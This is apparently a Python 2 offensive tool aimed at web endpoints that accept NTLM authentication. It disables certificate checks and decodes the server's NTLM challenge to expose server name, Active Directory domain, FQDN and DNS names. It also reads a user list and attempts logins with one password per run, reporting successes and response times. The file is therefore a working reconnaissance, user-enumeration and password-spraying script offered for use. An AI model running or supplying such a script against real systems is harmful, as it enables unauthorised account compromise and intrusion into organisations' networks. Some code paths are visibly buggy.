#!/user/bin/env python
import pycurl
import sys
import base64
import struct
import string
import collections
import time
import argparse
import re
import cStringIO

flags_tbl_str = """0x00000001	Negotiate Unicode
0x00000002	Negotiate OEM
0x00000004	Request Target
0x00000008	unknown
0x00000010	Negotiate Sign
0x00000020	Negotiate Seal
0x00000040	Negotiate Datagram Style
0x00000080	Negotiate Lan Manager Key
0x00000100	Negotiate Netware
0x00000200	Negotiate NTLM
0x00000400	unknown
0x00000800	Negotiate Anonymous
0x00001000	Negotiate Domain Supplied
0x00002000	Negotiate Workstation Supplied
0x00004000	Negotiate Local Call
0x00008000	Negotiate Always Sign
0x00010000	Target Type Domain
0x00020000	Target Type Server
0x00040000	Target Type Share
0x00080000	Negotiate NTLM2 Key
0x00100000	Request Init Response
0x00200000	Request Accept Response
0x00400000	Request Non-NT Session Key
0x00800000	Negotiate Target Info
0x01000000	unknown
0x02000000	unknown
0x04000000	unknown
0x08000000	unknown
0x10000000	unknown
0x20000000	Negotiate 128
0x40000000	Negotiate Key Exchange
0x80000000	Negotiate 56"""

flags_tbl = [line.split('\t') for line in flags_tbl_str.split('\n')]
flags_tbl = [(int(x, base=16), y) for x, y in flags_tbl]

#get params

parser = argparse.ArgumentParser()
parser.add_argument('--ntlm_url', type=str,
                    help="the url that allows ntlm authentication")
parser.add_argument('--user_list', type=str,
                    help="list of users to validate")
parser.add_argument('--password', type=str,
                    help="list of password to brute")
args = parser.parse_args()

if not args.ntlm_url:
    print('[-] Must Provide A URL')
    parser.print_usage()
    quit()


def flags_lst(flags):

    return [desc for val, desc in flags_tbl if val & flags]


def flags_str(flags):

    return ', '.join('"%s"' % s for s in flags_lst(flags))


VALID_CHRS = set(string.ascii_letters + string.digits + string.punctuation)


def clean_str(st):

    return ''.join((s if s in VALID_CHRS else '?') for s in st)


class StrStruct(object):
    def __init__(self, pos_tup, raw):
        length, alloc, offset = pos_tup
        self.length = length
        self.alloc = alloc
        self.offset = offset
        self.raw = raw[offset:offset+length]
        self.utf16 = False

        if len(self.raw) >= 2 and self.raw[1] == '\0':
            self.string = self.raw.decode('utf-16')
            self.utf16 = True
        else:
            self.string = self.raw

    def __str__(self):
        st = "%s'%s' [%s] (%db @%d)" % ('u' if self.utf16 else '',
                                        clean_str(self.string),
                                        self.raw.encode('hex'),
                                        self.length, self.offset)
        if self.alloc != self.length:
            st += " alloc: %d" % self.alloc
        return st

msg_types = collections.defaultdict(lambda: "UNKNOWN")
msg_types[1] = "Request"
msg_types[2] = "Challenge"
msg_types[3] = "Response"

target_field_types = collections.defaultdict(lambda: "UNKNOWN")
target_field_types[0] = "TERMINATOR"
target_field_types[1] = "[*] Server name"
target_field_types[2] = "[*] AD domain name"
target_field_types[3] = "[*] FQDN"
target_field_types[4] = "[*] DNS domain name"
target_field_types[5] = "[*] Parent DNS domain"
target_field_types[7] = "[*] Server Timestamp"

def ntlm_decode(user,pwd,url):
    st_raw = getDomainData(user,pwd,url)

    #print(st_raw)
    try:
        st = base64.b64decode(st_raw)
    except e:
        print ("[-] Input is not a valid base64-encoded string")
        return

    if st[:8] == "NTLMSSP\0":
        print ("[*] Found NTLMSSP header")
    #else:
    #    print ("NTLMSSP header not found at start of input string")
    #    return

    ver_tup = struct.unpack("<i", st[8:12])
    ver = ver_tup[0]

    print ("[*] Msg Type: %d (%s)") % (ver, msg_types[ver])

    if ver == 1:
        pretty_print_request(st)
    elif ver == 2:
        pretty_print_challenge(st)
    elif ver == 3:
        pretty_print_response(st)
    else:
        print("Unknown message structure.  Have a raw (hex-encoded) message:")
        print(st.encode("hex"))


def opt_str_struct(name, st, offset):

    nxt = st[offset:offset+8]
    if len(nxt) == 8:
        hdr_tup = struct.unpack("<hhi", nxt)
        print("%s: %s") % (name, StrStruct(hdr_tup, st))
    else:
        print("%s: [omitted]") % name


def opt_inline_str(name, st, offset, sz):
    nxt = st[offset:offset+sz]
    if len(nxt) == sz:
        print ("%s: '%s'") % (name, clean_str(nxt))
    else:
        print ("%s: [omitted]") % name


def pretty_print_request(st):
    hdr_tup = struct.unpack("<i", st[12:16])
    flags = hdr_tup[0]

    opt_str_struct("[*] Domain", st, 16)
    opt_str_struct("[*] Workstation", st, 24)

    opt_inline_str("OS Ver", st, 32, 8)

    print ("[*] Flags: 0x%x [%s]") % (flags, flags_str(flags))


def pretty_print_challenge(st):
    hdr_tup = struct.unpack("<hhiiQ", st[12:32])

    # print ("Target Name: %s") % StrStruct(hdr_tup[0:3], st)
    # print ("Challenge: 0x%x") % hdr_tup[4]

    flags = hdr_tup[3]

    opt_str_struct("[*] Context", st, 32)

    nxt = st[40:48]
    if len(nxt) == 8:
        hdr_tup = struct.unpack("<hhi", nxt)
        tgt = StrStruct(hdr_tup, st)

        output = "[*] Target: [block] (%db @%d)" % (tgt.length, tgt.offset)
        output = ""
        if tgt.alloc != tgt.length:
            output = " alloc: %d" % tgt.alloc
        print (output)

        raw = tgt.raw
        pos = 0

        while pos+4 < len(raw):
            rec_hdr = struct.unpack("<hh", raw[pos : pos+4])
            rec_type_id = rec_hdr[0]
            rec_type = target_field_types[rec_type_id]
            rec_sz = rec_hdr[1]
            subst = raw[pos+4 : pos+4+rec_sz]
            print ("%s (%d): %s") % (rec_type, rec_type_id, subst)
            pos += 4 + rec_sz

    # opt_inline_str("OS Ver", st, 48, 8)

    print ("[*] Flags: 0x%x [%s]") % (flags, flags_str(flags))


def pretty_print_response(st):
    hdr_tup = struct.unpack("<hhihhihhihhihhi", st[12:52])

    print ("LM Resp: %s") % StrStruct(hdr_tup[0:3], st)
    print ("NTLM Resp: %s") % StrStruct(hdr_tup[3:6], st)
    print ("Target Name: %s") % StrStruct(hdr_tup[6:9], st)
    print ("User Name: %s") % StrStruct(hdr_tup[9:12], st)
    print ("Host Name: %s") % StrStruct(hdr_tup[12:15], st)

    opt_str_struct("Session Key", st, 52)
    opt_inline_str("OS Ver", st, 64, 8)

    nxt = st[60:64]
    if len(nxt) == 4:
        flg_tup = struct.unpack("<i", nxt)
        flags = flg_tup[0]
        print ("Flags: 0x%x [%s]") % (flags, flags_str(flags))
    else:
        print ("Flags: [omitted]")

class Storage:
    def __init__(self):
        self.contents = ''
        self.line = 0

    def store(self, buf):
        self.line = self.line + 1
        self.contents = "%s%i: %s" % (self.contents, self.line, buf)

    def __str__(self):
        return self.contents


def getDomainData(user,pwd,url):


    curl = pycurl.Curl()
    curl.setopt(pycurl.URL, url)
    curl.setopt(pycurl.USERAGENT,"Mozilla/5.0 (Windows NT 6.1; Win64; x64;en; rv:5.0) Gecko/20110619 Firefox/5.0")
    curl.setopt(pycurl.SSL_VERIFYPEER, 0)
    curl.setopt(pycurl.SSL_VERIFYHOST, 0)
    curl.setopt(pycurl.VERBOSE, True)
    retrieved_body = Storage()
    retrieved_headers = Storage()
    curl.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
    curl.setopt(pycurl.USERPWD, "{}:{}".format(user, pwd))
    curl.setopt(curl.WRITEFUNCTION, retrieved_body.store)
    curl.setopt(curl.HEADERFUNCTION, retrieved_headers.store)
    start = time.time()
    curl.perform()
    end = time.time()
    print('[*] Baseline Response Time: ' + str(end - start))
    curl.close()
    retrieved_headers = str(retrieved_headers)
    retrieved_headers = retrieved_headers.split('NTLM')
    retrieved_headers = retrieved_headers[1].split("\\r\\n")
    return retrieved_headers[0]
    # print('[*] Retrieved Body:' + retrieved_body)


def makeAuthAttempt(user,pwd,url):
    hdr = cStringIO.StringIO()
    curl = pycurl.Curl()
    curl.setopt(pycurl.URL, url)
    curl.setopt(pycurl.SSL_VERIFYPEER, 0)
    curl.setopt(pycurl.SSL_VERIFYHOST, 0)
    retrieved_body = Storage()
    retrieved_headers = Storage()
    curl.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
    curl.setopt(pycurl.USERPWD, "{}:{}".format(user, pwd))
    curl.setopt(curl.WRITEFUNCTION, retrieved_body.store)
    curl.setopt(pycurl.HEADERFUNCTION, hdr.write)
    # respCode = curl.getinfo(pycurl.HTTP_CODE)
    start = time.time()
    curl.perform()
    end = time.time()
    authRespTime = str(end - start)
    print('[*] Authentication Response Time: ' + authRespTime + ' for user: ' + user)
    retrieved_headers = str(retrieved_headers)
    status_line = hdr.getvalue().splitlines()[10]
    response_code = re.match(r'HTTP\/\S*\s*\d+\s*(.*?)\s*$', status_line)
    response_message = str(response_code.groups(2))
    #response_message = str(response_code)
    curl.close()
    authDetails = [response_message, authRespTime]
    return authDetails


def userEnum(userIDs, pwd, url):

    if userIDs is None:
        print('[*] Need a txt file of userIDs to validate line separated')
        quit()
    else:
        with open(userIDs) as f:
            content = f.readlines()
        content = [x.strip() for x in content]

    for i in content:
        authInfo = makeAuthAttempt(i, pwd, url)
        if authInfo[0] is 'OK':
            print authInfo[0]
            print('[*] Authentication Success with user:' + i + ':' + pwd)
        else:
            print authInfo[0]
            print authInfo[1]





def main(userIDs, pwd, url):

    if args.user_list is None:
        if args.password is None:
            print('[*] Getting baseline domain information with null user and null pass')
            ntlm_decode("", "", url)
        else:
            print('[*] Getting baseline domain information with null user and pass: ' + args.password)
            ntlm_decode("", args.password, url)
    else:
        if args.password is None:
            print('[*] Getting baseline domain information, enumerating users with null password')
            userEnum(args.user_list, "", url)
        else:
            print('[*] Getting baseline domain information, enumerating users and attempted password spray with ' + args.password)
            userEnum(args.user_list, args.password, url)
    print('[*] Done')


if __name__ == '__main__':
    main(args.user_list, args.password, args.ntlm_url)

